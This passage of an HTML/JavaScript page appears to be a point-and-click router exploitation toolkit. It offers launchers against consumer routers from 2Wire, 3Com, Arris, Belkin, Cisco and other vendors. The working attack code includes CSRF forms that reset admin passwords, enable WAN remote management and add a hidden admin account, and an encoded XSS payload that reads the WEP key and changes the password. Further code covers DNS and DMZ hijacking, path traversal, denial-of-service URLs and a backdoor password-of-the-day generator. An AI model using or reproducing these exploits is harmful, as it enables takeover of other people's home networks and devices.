	document.location="http://"+ip+"/cgi-bin/webcm?getpage="+cmd;
}

function comtrendpass() {
	pass=prompt("New password:");
	document.comtrendpass.sptPassword.value=pass;
	document.comtrendpass.usrPassword.value=pass;
	document.comtrendpass.sysPassword.value=pass;
	document.comtrendpass.action="http://192.168.1.1";
	document.comtrendpass.submit();
}

function comtrendpassr() {
	ip=prompt("IP:");
	pass=prompt("New password:");
	document.comtrendpass.sptPassword.value=pass;
	document.comtrendpass.usrPassword.value=pass;
	document.comtrendpass.sysPassword.value=pass;
	document.comtrendpass.action="http://"+ip;
	document.comtrendpass.submit();
}

function ncomtrendpass() {
	pass=prompt("New password:");
	document.location="http://192.168.1.1/password.cgi?sysPassword="+pass+"&sptPassword="+pass;
}

function ncomtrendpassr() {
	ip=prompt("IP:");
	pass=prompt("New password:");
	document.location="http://"+ip+"/password.cgi?sysPassword="+pass+"&sptPassword="+pass;
}

function comtrendip() {
	ip=prompt("Local IP to put in DMZ:");
	document.location="http://192.168.1.1/scdmz.cmd?address="+ip;
}

function comtrendipr() {
	ipp=prompt("Router IP:");
	ip=prompt("Local IP to put in DMZ:");
	document.location="http://"+ipp+"/scdmz.cmd?address="+ip;
}

function xavi() {
	nombre=prompt("Name of the rule:");
	ip=prompt("Allow IP:");
	port=prompt("Allow Port:");
	document.location="http://192.168.1.1/webconfig/portforwarding/portforwarding1.html/natAdd?apptype=userdefined&rulename="+nombre+"&waninterface=ppp-0&inthostip="+ip+"&protocol1=proto_6&extportstart1="+port+"&extportend1="+port+"&intportstart1="+port+"&intportend1="+port+"&protocol2=NONE&protocol3=NONE&Applybutton=Apply";
}

function xavir() {
	ipp=prompt("Target IP:");
	nombre=prompt("Name of the rule:");
	ip=prompt("Allow IP:");
	port=prompt("Allow Port:");
	document.location="http://"+ipp+"/webconfig/portforwarding/portforwarding1.html/natAdd?apptype=userdefined&rulename="+nombre+"&waninterface=ppp-0&inthostip="+ip+"&protocol1=proto_6&extportstart1="+port+"&extportend1="+port+"&intportstart1="+port+"&intportend1="+port+"&protocol2=NONE&protocol3=NONE&Applybutton=Apply";
}

/*
 * Arris TM602A password of the day generator
 * 
 * Author: Raul Pedro Fernandes Santos
 * Project homepage: http://www.borfast.com/projects/arrispwgen
 * 
 * Copyright (c) 2010, Raul Pedro Fernandes Santos
 * All rights reserved.
*/

function GenArrisPasswords(startdate, enddate) {
  var password_count;
  var date1, date2;
  var one_day_in_milliseconds = 24 * 60 * 60 * 1000; 
  if (startdate !== undefined && enddate !== undefined) {
    password_count = Math.ceil((enddate - startdate) / one_day_in_milliseconds);
  } else {
    password_count = 1;
    if (startdate === undefined) {
      startdate = (new Date()).getTime();
    }
  }

  if ((password_count < 1) | (password_count > 365)) {
    alert('Since we can only generate passwords for a full year at a time, the number of passwords must be between 1 and 365.');
  } else {
    var seed = 'MPSJKMDHAI';
    var seedeight = seed.substr(0, 8);
    var seedten = seed;

    var table1 = [
      [15, 15, 24, 20, 24],
      [13, 14, 27, 32, 10],
      [29, 14, 32, 29, 24],
      [23, 32, 24, 29, 29],
      [14, 29, 10, 21, 29],
      [34, 27, 16, 23, 30],
      [14, 22, 24, 17, 13]
    ];

    var table2 = [
      [0, 1, 2, 9, 3, 4, 5, 6, 7, 8],
      [1, 4, 3, 9, 0, 7, 8, 2, 5, 6],
      [7, 2, 8, 9, 4, 1, 6, 0, 3, 5],
      [6, 3, 5, 9, 1, 8, 2, 7, 4, 0],
      [4, 7, 0, 9, 5, 2, 3, 1, 8, 6],
      [5, 6, 1, 9, 8, 0, 4, 3, 2, 7]
    ];

    var alphanum = [
      '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D',
      'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
      'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
    ];

    var list1 = [];
    var list2 = [];
    var list3 = [];
    var list4 = [];
    var list5 = [];    
    var year;
    var month;
    var day_of_month;
    var day_of_week;
    var iter, i;
    for (iter = 0; iter < password_count; iter++) {
      date = new Date(startdate + (iter * one_day_in_milliseconds));
      year = parseInt(date.getFullYear().toString(10).substr(2, 2), 10);
      month = date.getMonth() + 1;
      day_of_month = date.getDate();
      day_of_week = date.getDay() - 1;
      if (day_of_week < 0) {
      	day_of_week = 6;
      }
      for (i = 0; i <= 4; i++) {
        list1[i] = table1[day_of_week][i];
      }
      list1[5] = day_of_month;
      if (((year + month) - day_of_month) < 0) {
        list1[6] = (((year + month) - day_of_month) + 36) % 36;
      } else {
        list1[6] = ((year + month) - day_of_month) % 36;
      }
      list1[7] = (((3 + ((year + month) % 12)) * day_of_month) % 37) % 36;
      for (i = 0; i <= 7; i++) {
        list2[i] = (seedeight.substr(i, 1).charCodeAt(0)) % 36;
      }
      for (i = 0; i <= 7; i++) {
        list3[i] = (((list1[i] + list2[i])) % 36);
      }
      list3[8] = (list3[0] + list3[1] + list3[2] + list3[3] + list3[4] +
          list3[5] + list3[6] + list3[7]) % 36;
      var num8 = (list3[8] % 6);
      list3[9] = Math.round(Math.pow(num8, 2));
      for (i = 0; i <= 9; i++) {
        list4[i] = list3[table2[num8][i]];
      }
      for (i = 0; i <= 9; i++) {
        list5[i] = ((seedten.substr(i, 1).charCodeAt(0)) + list4[i]) % 36;
      }
      var password_of_the_day = [];
      var len = list5.length;
      for (i = 0; i < len; i++) {
        password_of_the_day[i] = alphanum[list5[i]];
      }
      password_of_the_day = password_of_the_day.join('');
      alert('Arris cable modem password of the day: ' + password_of_the_day);
    }
  }
}
</script>

</head>
<body bgcolor="black" text="white" alink="green" vlink="green" link="green">

<script type="text/javascript">
	$(document).ready(function(){ init(); });
</script>

<?php if(file_exists("/www/pineapple/includes/navbar.php")) require('/www/pineapple/includes/navbar.php'); ?>
	<section id="contenedor">
		<section id="marcas">
			<h2><a href="#wire">2Wire</a></h2><br/>
			<h2><a href="#com">3Com</a></h2><br/>
			<h2><a href="#arris">Arris</a></h2><br/>
			<h2><a href="#asmax">Asmax</a></h2><br/>
			<h2><a href="#belkin">Belkin</a></h2><br/>
			<h2><a href="#cisco">Cisco</a></h2><br/>
			<h2><a href="#comtrend">Comtrend</a></h2><br/>
			<h2><a href="#DDWRT">DD-Wrt</a></h2><br/>
			<h2><a href="#DLink">DLink</a></h2><br/>
			<h2><a href="#fibrehome">Fibrehome</a></h2><br/>
			<h2><a href="#huawei">Huawei</a></h2><br/>
			<h2><a href="#mifi">MiFi</a></h2><br/>
			<h2><a href="#motorola">Motorola</a></h2><br/>
			<h2><a href="#netgear">Netgear</a></h2><br/>
			<h2><a href="#siemens">Siemens</a></h2><br/>
			<h2><a href="#thomson">Thomson</a></h2><br/>
			<h2><a href="#trendnet">TRENDnet</a></h2><br/>
			<h2><a href="#ubiquiti">Ubiquiti</a></h2><br/>
			<h2><a href="#utstarcom">UTStarcom</a></h2><br/>
			<h2><a href="#xavi">Xavi</a></h2><br/>
			<h2><a href="#zyxel">ZyXEL</a></h2>
		</section>
		<section id="herramientas">
			<h3><a href="javascript:macfind()">MAC to Vendor Lookup and Search (mac_find)</a></h3>
			<h3><a href="http://www.phenoelit.org/dpl/dpl.html">Default Password List (phenoelit)</a></h3>
			<h3><a href="javascript:shodan()">Computer Search Engine (shodan)</a></h3>
</section>
<section id="generadores">
<article><div><h4><a href="http://50.57.229.26/zynos.php">ZynOS (Huawei) Configuration Decompressor</a></h4></div></article>
<article><div><h4><a href="javascript:mac2wepkey()">Huawei HG5XX Mac2wepkey Default Wireless Key Generator</a></h4></div></article>
<article><div><h4><a href="javascript:document.location='http://50.57.229.26/stkeys.php?ssid='+prompt('SSID:');">Thomson SpeedTouch STKeys Default Wireless Key Generator</a></h4></div></article>
<article><div><h4><a href="javascript:eval(acctongen())">Backdoor password in Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore)</a></h4></div></article>
<article><div><h4><a href="javascript:GenArrisPasswords()">Arris Password of The Day Generator</a></h4></div></article>
</section>
		
<section id="exploits">


<form name="singwiredos" action="http://192.168.1.254/xslt" method="post">
<input type="hidden" name="PAGE" value="S01">
<input type="hidden" name="view" value="XML">
<input type="hidden" name="THISPAGE" value="J21">
<input type="hidden" name="NEXTPAGE" value="J21_REBOOT">
<input type="hidden" name="PASSWORD" value="2wire">
</form>
<section id="wire">
<h2>2Wire</h2>
<h3><a href="javascript:img('1700HG')">1700HG</a>, <a href="javascript:img('1701HG')">1701HG</a>, <a href="javascript:img('1800HW')">1800HW</a>, <a href="javascript:img('2071HG')">2071HG</a>, <a href="javascript:img('2700HG')">2700HG</a>, <a href="javascript:img('2701HG-T')">2701HG-T</a>, <a href="javascript:img('2701HGV-E')">2701HGV-E</a>, <a href="javascript:img('2700HGV-2')">2700HGV-2</a>, <a href="javascript:img('3800HGV-B')">3800HGV-B</a></h3>

<article>
	<div>03/02/12</div>
	<div><a href="https://www.underground.org.mx/index.php?topic=22175.msg141787#msg141787">[+]</a></div>
	<div><a href="http://gateway.2wire.net/xslt?PAGE=BJ_STATUS">2701HG remote administration password disclosure</a></div>
	<div><a href="javascript:setip('/xslt?PAGE=BJ_STATUS')">[IP]</a></div>
</article>

<article>
	<div>11/01/11</div>
	<div><a href="http://blog.szechuen.com/cve-2011-3682">[+]</a></div>
	<div><a href="javascript:singwiredos.submit()">2701HGV-E 2700HGV-2 2700HG singtel default mdc password DoS</a></div>
	<div><a href="javascript:singwiredosr()">[IP]</a></div>
</article>

<article>
	<div>07/14/11</div>
	<div><a href="http://www.hakim.ws/2wire/1-003.full.txt">[+]</a></div>
	<div><a href='http://home/xslt?PAGE=A05&THISPAGE=</script><script>eval(unescape(location.href))</script>#%0Atry%20%7B%20%0A%09xmlhttp%3Dnew%20ActiveXObject%28%22MSXML2.XMLHTTP%22%29%3B%20%0A%7D%20catch%28e%29%20%7B%20%0A%09xmlhttp%20%3D%20new%20XMLHttpRequest%28%29%20%0A%7D%0Avar%20pass%20%3D%20prompt%28%22New%20password%3A%22%29%3B%0Axmlhttp.open%28%22GET%22%2C%22%2fxslt%3Fpage%3Dmgmt_data%22%2Cfalse%29%3B%0Axmlhttp.send%28null%29%3B%0Avar%20info%20%3D%20xmlhttp.responseText%3B%0Avar%20wep%20%3D%20info.substr%28info.indexOf%28%22encrypt_key%5C%22%5C%3E0x%22%29%2b15%2C10%29%3B%0Axmlhttp.open%28%22POST%22%2C%22%2fxslt%22%2Ctrue%29%3B%0Axmlhttp.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3B%0Axmlhttp.send%28%22PAGE%3DA04_POST%26THISPAGE%3DA04%26NEXTPAGE%3DA04_POST%26SYSKEY%3D%22%2bwep%2b%22%26PASSWORD%3D%22%2bpass%2b%22%26PASSWORD_CONF%3D%22%2bpass%2b%22%26HINT%3D%22%2bpass%29%3B%0Aalert%28%22Done%22%29'>20x 27x authentication bypass (xss + info disclosure)</a></div><!-- tienen que aceptar que esta bonito el exploit :) -->
</article>

<article>
	<div>10/29/09</div>
	<div><a href="http://www.hakim.ws/2wire/1-003.full.txt">[+]</a></div>
	<div><a href="https://home:50001/xslt?page=%0d%0a">17x 18x 20x 27x CRLF denial of service remote MDC</a></div>
	<div><a href="javascript:wirecrlfr()">[IP]</a></div>
</article>

<article>
	<div>10/29/09</div>
	<div><a href="http://www.hakim.ws/2wire/1-003.full.txt">[+]</a></div>
	<div><a href="http://home/xslt?page=%0d%0a">17x 18x 20x 27x CRLF denial of service</a></div>
	<div><a href="javascript:wirecrlf()">[IP]</a></div>
</article>

<article>
	<div>08/18/09</div>
	<div><a href="http://www.exploit-db.com/exploits/9459">[+]</a></div>
	<div><a href="http://gateway.2wire.net/setup/password_required.html">17x 18x 20x 27x password_required.html authentication bypass</a></div>
	<div><a href="javascript:setip('/setup/password_required.html')">[IP]</a></div>
</article>

<article>
	<div>08/11/09</div>
	<div><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">[+]</a></div>
	<div><a href="http://home/xslt?page=CD35_SETUP_01">17x 18x 20x 27x CD35_SETUP_01 authentication bypass</a></div>
	<div><a href="javascript:setip('/xslt?page=CD35_SETUP_01')">[IP]</a></div>
</article>

<article>
	<div>08/11/09</div>
	<div><a href="http://www.hakim.ws/2wire/2wire_CD35_AuthBypass_PassReset_esp.txt">[+]</a></div>
	<div><a href="http://home/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm">17x 18x 20x 27x CD35_SETUP_01 password reset</a></div>
	<div><a href="javascript:setip('/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm')">[IP]</a></div>
</article>

<article>
	<div>04/13/08</div>
	<div><a href="http://hakim.ws/2wire/dsldos.html">[+]</a></div>
	<div><a href="http://home/xslt?page=%^">17x 18x 20x 27x DSL denial of service</a></div>
	<div><a href="javascript:setip('/xslt?page=%^')">[IP]</a></div>
</article>

<article>
	<div>08/07/08</div>
	<div><a href="http://www.hakim.ws/2wire/urlmagico.txt">[+]</a></div>
	<div><a href="http://home/xslt?page=mgmt_data">17x 18x 20x 27x mgmt_data configuration disclosure</a></div>
	<div><a href="javascript:setip('/xslt?page=mgmt_data')">[IP]</a></div>
</article>

<article>
	<div>01/30/08</div>
	<div><a href="http://www.securityfocus.com/bid/27516/info">[+]</a></div>
	<div><a href="http://home/xslt?page=H04">17x 18x 20x 27x H04 authentication bypass</a></div>
	<div><a href="javascript:setip('/xslt?page=H04')">[IP]</a></div>
</article>

<article>
	<div>08/14/07</div>
	<div><a href="http://hakim.ws/textos/2wirexsrf.txt">[+]</a></div>
	<div><a href="javascript:wireAddHosts()">17x 18x 20x 27x 38x Add domain to hosts table CSRF</a></div>
	<div><a href="javascript:wireAddHostsip()">[IP]</a></div>
</article>
<div style="float: right";><a href="#">^ Top</a></div>
</section>

<section id="com">
<h2>3Com</h2>
<h3><a href="javascript:img('OfficeConnect Wireless 11g Cable/DSL Gateway')">OfficeConnect Wireless 11g Cable/DSL Gateway</a>, <a href="javascript:img('AP 8760 3CRWE876075')">AP 8760 3CRWE876075</a>, <a href="javascript:img('OfficeConnect 812')">812</a>, <a href="javascript:img('3CRWE454G72')">3CRWE454G72</a>, <a href="javascript:img('3cradsl72')">3cradsl72</a></h3>

<article>
	<div>09/02/10</div>
	<div><a href="http://www.exploit-db.com/exploits/14875/">[+]</a></div>
	<div><a href="javascript:eval(acctongen())">Backdoor password in Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore)</a></div>
	<div></div>
</article>

<article>
	<div>05/21/10</div>
	<div><a href="http://www.exploit-db.com/exploits/12680">[+]</a></div>
	<div><a href="javascript:setip(':8080/imc/reportscript/sqlserver/deploypara.properties')">iMC Intelligent Management Center configuration disclosure</a></div>
	<div><a href="javascript:setip(':8080/imc/reportscript/sqlserver/deploypara.properties')">[IP]</a></div>
</article>

<article>
	<div>05/21/10</div>
	<div><a href="http://www.exploit-db.com/exploits/12679">[+]</a></div>
	<div><a href="javascript:setip(':8080/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini')">iMC Intelligent Management Center traversal</a></div>
	<div><a href="javascript:setip(':8080/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini')">[IP]</a></div>
</article>

<article>
	<div>10/19/09</div>
	<div><a href="http://www.exploit-db.com/exploits/9862">[+]</a></div>
	<div><a href="javascript:comcommandl()">OfficeConnect command execution </a></div>
	<div><a href="javascript:comcommand()">[IP]</a></div>
</article>

<article>
	<div>11/14/08</div>
	<div><a href="http://packetstormsecurity.org/0811-exploits/PR07-40.txt">[+]</a></div>
	<div><a href="http://169.254.2.1/advanced.htm">AP 8760 auhentication bypass</a></div>
	<div><a href="javascript:setip('/advanced.htm')">[IP]</a></div>
</article>

<article>
	<div>06/16/08</div>
	<div><a href="http://www.ikkisoft.com/stuff/LC-2008-05.txt">[+]</a></div>
	<div><a href="http://192.168.1.1/SaveCfgFile.cgi">OfficeConnect configuration disclosure</a></div>
	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[IP]</a></div>
</article>

<article>
	<div>06/01/05</div>
	<div><a href="http://seclists.org/vulnwatch/2005/q1/42">[+]</a></div>
	<div><a href="http://192.168.1.1/main/config.bin">OfficeConnect 3CRWE454G72 configuration disclosure</a></div>
	<div><a href="javascript:setip('/main/config.bin')">[IP]</a></div>
</article>

<article>
	<div>04/16/05</div>
	<div><a href="http://lostmon.blogspot.com/2005/04/3com-adsl-11g-cradsl72-router.html">[+]</a></div>
	<div><a href="http://192.168.1.1/cgi-bin/config.bin">3cradsl72 configuration disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/config.bin')">[IP]</a></div>
</article>

<article>
	<div>10/13/04</div>
	<div><a href="http://www.securityfocus.com/bid/11408">[+]</a></div>
	<div><a href="http://192.168.1.1/app_sta.stm">3cradsl72 information disclosure & authenication bypass</a></div>
	<div><a href="javascript:setip('/app_sta.stm')">[IP]</a></div>
</article>

<article>
	<div>00/00/01</div>
	<div><a href="http://www.ikkisoft.com/stuff/LC-2008-05.txt">[+]</a></div>
	<div><a href="http://192.168.1.254/graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s">812 denial of service</a></div>
	<div><a href="javascript:setip('/graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s')">[IP]</a></div>
</article>

<article>
	<div>00/00/01</div>
	<div><a href="http://www.ikkisoft.com/stuff/LC-2008-05.txt">[+]</a></div>
	<div><a href="http://192.168.1.254/adsl_reset">812 denial of service 2</a></div>
	<div><a href="javascript:setip('/adsl_reset')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="arris">
<h2>Arris</h2>
<h3><a href="javascript:img('WTM652')">WTM652</a>, <a href="javascript:img('TM602A')">TM602A</a></h3>

<article>
	<div>00/00/0?</div>
	<div><a href="http://www.dslreports.com/forum/r24063736-Arris-Password-of-the-Day">[+]</a></div>
	<div><a href="javascript:GenArrisPasswords();">Arris Password of The Day Generator</a> (<a href=arris-potd.txt>list.txt</a>)</div>
	<div></div>
</article>

<article>
	<div>00/00/0?</div>
	<div><a href="http://www.dslreports.com/forum/r24063736-Arris-Password-of-the-Day">[+]</a></div>
	<div><a href="http://192.168.100.1">Arris password of the day web interface</a></div>
	<div></div>
</article>

<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="asmax">
<h2>Asmax</h2>
<h3><a href="javascript:img('AR-804gu')">AR-804gu</a></h3>

<article>
	<div>05/15/09</div>
	<div><a href="http://www.securitum.pl/dh/asmax-ar-804-gu-compromise">[+]</a></div>
	<div><a href="javascript:asmrce()">AR-804gu command execution</a></div>
	<div><a href="javascript:asmrce()">[IP]</a></div>
</article>

<article>
	<div>05/15/09</div>
	<div><a href="http://www.securitum.pl/dh/asmax-ar-804-gu-compromise">[+]</a></div>
	<div><a href="javascript:asmfile()">AR-804gu file disclosure</a></div>
	<div><a href="javascript:asmfile()">[IP]</a></div>
</article>

<article>
	<div>05/15/09</div>
	<div><a href="http://www.securitum.pl/dh/asmax-ar-804-gu-compromise">[+]</a></div>
	<div><a href="http://192.168.1.1/cgi-bin/">AR-804gu directory listing</a></div>
	<div><a href="javascript:setip('/cgi-bin/')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="belkin">
<form name='belkindns' action='http://192.168.2.1/cgi-bin/setup_dns.exe' method='post'>
<input type=hidden name='dns1_1'>
<input type=hidden name='dns1_2'>
<input type=hidden name='dns1_3'>
<input type=hidden name='dns1_4'>
<input type=hidden name='dns2_1'>
<input type=hidden name='dns2_2'>
<input type=hidden name='dns2_3'>
<input type=hidden name='dns2_4'>
</form>
<form name='belkinrest' action="http://192.168.2.1/cgi-bin/restore.exe" method='post'>
<input type="hidden" name="page" value="tools_restore">
<input type="hidden" name="logout">
</form>
<h2>Belkin</h2>
<h3><a href="javascript:img('Belkin Wireless G router F5D7234-4')">Belkin Wireless G router F5D7234-4</a>, <a href="javascript:img('F5D7230-4')">F5D7230-4</a>, <a href="javascript:img('MIMO F5D9230??4')">MIMO F5D9230??4</a></h3>

<article>
	<div>05/30/11</div>
	<div><a href="http://www.exploit-db.com/exploits/17349/">[+]</a></div>
	<div><a href="http://192.168.2.1/login.stm">F5D7234-4 v5 admin password md5</a></div>
	<div><a href="javascript:setip('/login.stm')">[IP]</a></div>
</article>

<article>
	<div>08/25/08</div>
	<div><a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">[+]</a></div>
	<div><a href="http://192.168.2.1/system.stm">F5D8233-4 v3 configuration disclosure</a></div>
	<div><a href="javascript:setip('/system.stm')">[IP]</a></div>
</article>

<article>
	<div>08/25/08</div>
	<div><a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">[+]</a></div>
	<div><a href="http://192.168.2.1/cgi-bin/restart.exe">F5D8233-4 v3 router reboot</a></div>
	<div><a href="javascript:setip('/cgi-bin/restart.exe')">[IP]</a></div>
</article>

<article>
	<div>08/25/08</div>
	<div><a href="http://exploit-db.com/exploits/6305">[+]</a></div>
	<div><a href="javascript:document.belkinrest.submit();">F5D7230-4 factory reset</a></div>
	<div><a href="javascript:belkinrest()">[IP]</a></div>
</article>

<article>
	<div>02/03/08</div>
	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
	<div><a href="javascript:belkindns()">F5D7230-4 change dns servers</a></div>
	<div><a href="javascript:belkindnsr()">[IP]</a></div>
</article>

<article>
	<div>01/20/08</div>
	<div><a href="http://exploit-db.com/exploits/4941">[+]</a></div>
	<div><a href="http://192.168.2.1/SaveCfgFile.cgi">MIMO F5D9230??4 configuration disclosure</a></div>
	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="cisco">
<form name='wrtwifi' action='http://192.168.1.1/Security.tri' method='post'><input type=hidden name='SecurityMode' value="0"><input type=hidden name='layout' value="en"></form>
<form name='wrtdefault' action='http://192.168.1.1/factdefa.tri' method='post'><input type=hidden name='FactoryDefaults' value="Yes"><input type=hidden name='layout' value="en"></form>
<form name='wrtadmin' action='http://192.168.1.1/manage.tri' method='post'>
<input type=hidden name=http_passwd>
<input type=hidden name=http_passwdConfirm>
<input type=hidden name=remote_management>
<input type=hidden name=remote_mgt_https value=0>
<input type=hidden name=http_enable value=1>
<input type=hidden name=https_enable value=0>
<input type=hidden name=PasswdModify value=1>
<input type=hidden name=_http_enable value=1>
<input type=hidden name=web_wl_filter value=1>
<input type=hidden name=remote_management value=1>
<input type=hidden name=http_wanport value=31337>
<input type=hidden name=upnp_enable value=1>
<input type=hidden name=layout value=en>
</form>
<form action="http://192.168.1.1/setup.cgi" method="POST" name="wag120pass">
<input type="hidden" name="user_list" value="1">
<input type="hidden" name="h_user_list" value="1">
<input type="hidden" name="sysname" value="admin">
<input type="hidden" name="sysPasswd" value="password">
<input type="hidden" name="sysConfirmPasswd" value="password">
<input type="hidden" name="remote_management" value="enable">
<input type="hidden" name="http_wanport" value="8080">
<input type="hidden" name="upnp_enable" value="enable">
<input type="hidden" name="wlan_enable" value="enable">
<input type="hidden" name="igmp_proxy_enable" value="enable">
<input type="hidden" name="save" value="Save+Settings">
<input type="hidden" name="h_pwset" value="yes">
<input type="hidden" name="sysname_changed" value="yes">
<input type="hidden" name="pwchanged" value="yes">
<input type="hidden" name="pass_is_default" value="false">
<input type="hidden" name="h_remote_management" value="enable">
<input type="hidden" name="pass_is_none" value="no">
<input type="hidden" name="h_upnp_enable" value="enable">
<input type="hidden" name="h_wlan_enable" value="enable">
<input type="hidden" name="h_igmp_proxy_enable" value="enable">
<input type="hidden" name="todo" value="save">
<input type="hidden" name="this_file" value="Administration.htm">
<input type="hidden" name="next_file" value="Administration.htm">
<input type="hidden" name="message" value="">
<input type="hidden" name="h_wps_cur_status" value=""> 
</form>
<form action="http://192.168.1.1/setup.cgi" method="POST" name="wag120add">
<input type="hidden" name="user_list" value="2">
<input type="hidden" name="h_user_list" value="2">
<input type="hidden" name="sysname" value="ircrash">
<input type="hidden" name="sysPasswd" value="password">
<input type="hidden" name="sysConfirmPasswd" value="password">
<input type="hidden" name="remote_management" value="enable">
<input type="hidden" name="http_wanport" value="8080">
<input type="hidden" name="upnp_enable" value="enable">
<input type="hidden" name="wlan_enable" value="enable">
<input type="hidden" name="igmp_proxy_enable" value="enable">
<input type="hidden" name="save" value="Save+Settings">
<input type="hidden" name="h_pwset" value="yes">
<input type="hidden" name="sysname_changed" value="yes">
<input type="hidden" name="pwchanged" value="yes">
<input type="hidden" name="pass_is_default" value="false">
<input type="hidden" name="h_remote_management" value="enable">
<input type="hidden" name="pass_is_none" value="yes">
<input type="hidden" name="h_upnp_enable" value="enable">
<input type="hidden" name="h_wlan_enable" value="enable">
<input type="hidden" name="h_igmp_proxy_enable" value="enable">
<input type="hidden" name="todo" value="save">
<input type="hidden" name="this_file" value="Administration.htm">
<input type="hidden" name="next_file" value="Administration.htm">
<input type="hidden" name="message" value="">
